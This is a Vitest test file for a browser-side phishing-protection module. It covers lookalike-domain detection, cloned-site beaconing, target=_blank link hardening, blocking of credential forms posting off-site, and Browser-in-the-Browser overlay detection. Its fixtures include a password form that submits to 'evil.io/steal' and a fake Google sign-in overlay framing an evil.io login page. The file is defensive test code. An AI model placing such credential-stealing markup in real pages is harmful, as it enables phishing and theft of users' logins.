import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { phishingGuard, checkLookalike } from '../../modules/phishingGuard'
import { events } from '../../core/events'

const flush = () => new Promise(r => setTimeout(r, 0))

describe('phishingGuard', () => {
  beforeEach(() => {
    events.reset()
    document.body.innerHTML = ''
  })
  afterEach(() => phishingGuard.disable())

  it('spots lookalike domains', () => {
    expect(checkLookalike('paypa1.com', ['paypal.com']).lookalike).toBe(true)
    expect(checkLookalike('rnybank.com', ['mybank.com']).reasons).toContain('homoglyph')
    expect(checkLookalike('mybank-secure-login.com', ['mybank.com']).reasons).toContain('contains-brand')
    expect(checkLookalike('xn--pypal-4ve.com', ['paypal.com']).lookalike).toBe(true)
    expect(checkLookalike('app.mybank.com', ['mybank.com']).lookalike).toBe(false)
    expect(checkLookalike('google.com', ['mybank.com']).lookalike).toBe(false)
    expect(checkLookalike('paypa1-secure.com', ['paypal.com']).reasons).toContain('homoglyph-in-part')
    expect(checkLookalike('login-paypai.com', ['paypal.com']).lookalike).toBe(true)
    expect(checkLookalike('my-shop.com', ['paypal.com']).lookalike).toBe(false)
  })

  it('detects when the site runs on an unexpected host (clone) and beacons', () => {
    const beacon = vi.fn(() => true)
    Object.defineProperty(navigator, 'sendBeacon', { configurable: true, value: beacon })
    const seen = vi.fn()
    events.on('site_clone_detected', seen)
    // jsdom runs on localhost
    phishingGuard.enable({ expectedHosts: ['myapp.com'], cloneBeaconUrl: 'https://myapp.com/api/clone' })
    expect(seen).toHaveBeenCalledTimes(1)
    expect(beacon).toHaveBeenCalledWith('https://myapp.com/api/clone', expect.stringContaining('site_clone_detected'))
    expect(phishingGuard.checkClone(['localhost'])).toBe(false)
  })

  it('fixes target=_blank links, including new ones', async () => {
    document.body.innerHTML = '<a id="a" href="https://x.com" target="_blank">x</a>'
    phishingGuard.enable()
    expect(document.getElementById('a')!.getAttribute('rel')).toBe('noopener noreferrer')
    document.body.insertAdjacentHTML('beforeend', '<a id="b" href="https://y.com" target="_blank" rel="external">y</a>')
    await flush()
    expect(document.getElementById('b')!.getAttribute('rel')).toBe('external noopener noreferrer')
  })

  it('blocks credential forms submitting to a foreign origin in enforce mode', () => {
    document.body.innerHTML = '<form id="f" action="https://evil.io/steal"><input type="password" name="p"></form>'
    phishingGuard.enable({ mode: 'enforce' })
    const ev = new Event('submit', { cancelable: true, bubbles: true })
    document.getElementById('f')!.dispatchEvent(ev)
    expect(ev.defaultPrevented).toBe(true)
  })

  it('flags Browser-in-the-Browser overlays', async () => {
    const seen = vi.fn()
    events.on('browser_in_browser_overlay', seen)
    phishingGuard.enable()
    document.body.insertAdjacentHTML('beforeend', `
      <div style="position:fixed;z-index:99999;top:50px;left:50px">
        <div class="bar">🔒 https://accounts.google.com/signin</div>
        <iframe src="https://evil.io/fake-login"></iframe>
      </div>`)
    await flush()
    expect(seen).toHaveBeenCalledTimes(1)
    expect(seen.mock.calls[0][0].details.signals).toEqual(expect.arrayContaining(['identity-provider-url', 'iframe', 'url-mismatch']))
  })
})
